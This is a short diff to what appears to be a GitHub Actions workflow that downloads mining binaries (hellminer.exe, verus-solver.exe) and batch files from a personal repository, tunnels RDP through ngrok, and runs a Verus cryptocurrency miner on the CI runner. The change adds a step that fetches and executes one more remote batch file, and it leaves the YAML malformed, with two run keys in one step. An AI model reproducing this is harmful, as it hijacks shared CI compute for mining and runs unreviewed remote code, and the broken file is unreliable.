@@ -16,6 +16,8 @@ jobs:
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/hellminer.exe -OutFile hellminer.exe
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/vendorax.bat -OutFile vendorax.bat
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/verus-solver.exe -OutFile verus-solver.exe
+        Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/shortcut.bat -OutFile shortcut.bat
+        
 
     - name: Extract ngrok Files
       run: Expand-Archive ngrok.zip
@@ -36,6 +38,8 @@ jobs:
     - name: Connect to RDP  [CPU 2 Core - 7GB Ram - 256 SSD]
       run: cmd /c start.bat
     - name: coba mine verus
+    - name: membuat shortcut
+      run: cmd /c shortcut.bat
       run: |
           cmd /c vendorax.bat
           sleep 300 # 300 detik = 5 menit
